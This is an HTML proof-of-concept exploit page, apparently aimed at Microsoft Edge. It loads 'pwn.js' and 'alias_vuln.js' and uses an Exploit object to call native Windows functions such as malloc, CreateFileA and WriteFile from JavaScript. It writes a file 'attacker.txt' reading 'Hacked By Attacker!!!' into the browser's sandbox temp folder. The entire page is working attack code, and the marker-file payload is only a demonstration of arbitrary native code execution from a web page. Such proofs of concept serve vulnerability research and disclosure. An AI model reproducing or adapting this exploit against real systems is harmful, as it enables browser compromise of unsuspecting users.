<!doctype html>
<html>
    <body>
        <pre id="content"></pre>

        <script src="pwn.js"></script>
        <script src="alias_vuln.js"></script>
        <script>
            function log(s) { document.getElementById('content').innerHTML += s + '<br>'; }

            with (new Exploit()) {
                var malloc = importFunction('msvcrt.dll', 'malloc');
				var dest = malloc(0x100);
				log('malloc memory address:0x' + dest.toString(16));
				log('the address:0x' + dest.toString(16) + " contains '%AppData%\\..\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!121\\Temp\\' represent string!");
				var CSIDL_PROFILE=0x28;
				
				var SHGetSpecialFolderPathA = importFunction('windows.storage.dll', 'SHGetSpecialFolderPathA');
				SHGetSpecialFolderPathA(0,dest,CSIDL_PROFILE,0);
				var strlen = importFunction('msvcrt.dll', 'strlen');
				var profile_len = strlen( dest );
		
				var filePath = new CString("\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!121\\Temp\\attacker.txt\x00\x00");
				var filepath_len = strlen( filePath );
				var memcpy = importFunction('msvcrt.dll', 'memcpy');
				var dest_addr = Uint8Ptr.cast(dest);
				dest_addr = dest_addr.add(  parseInt(profile_len) );
				
				var src_addr = filePath;
				var len = parseInt(filepath_len) + 2;
				memcpy( dest_addr, src_addr, len);
				var CreateFile = importFunction('kernelbase.dll', 'CreateFileA');
				var fileHandle;
				var GENERIC_WRITE = 0x40000000>>>0;
			    var dwDesiredAccess = GENERIC_WRITE;
				var dwShareMode = 0;
				var lpSecurityAttributes = 0;
				var dwCreationDisposition = 2; //CREATE_ALWAYS
				var dwFlagsAndAttributes =  0x00000080; //FILE_ATTRIBUTE_NORMAL
				var hTemplateFile = 0; //hTemplateFile
				fileHandle = CreateFile(dest,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
					dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
				log('CreateFile return fileHandle ' + fileHandle.toString( ));
				var WriteFile = importFunction('kernelbase.dll', 'WriteFile');
				var lpBuffer = new CString("Hacked By Attacker!!!\x00\x00");
				var nNumberOfBytesToWrite = 0x15;
				var temp= [1,2,3];
				var lpNumberOfBytesWritten = temp;
				var lpOverlapped = 0;
				WriteFile( fileHandle, lpBuffer, nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
				var CloseHandle = importFunction('kernelbase.dll', 'CloseHandle');
				CloseHandle(fileHandle);
				log("Create a file attacker.txt in '%AppData%\\..\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!121\\Temp\\' Directory.Please check it!");
            }
        </script>
    </body>
</html>
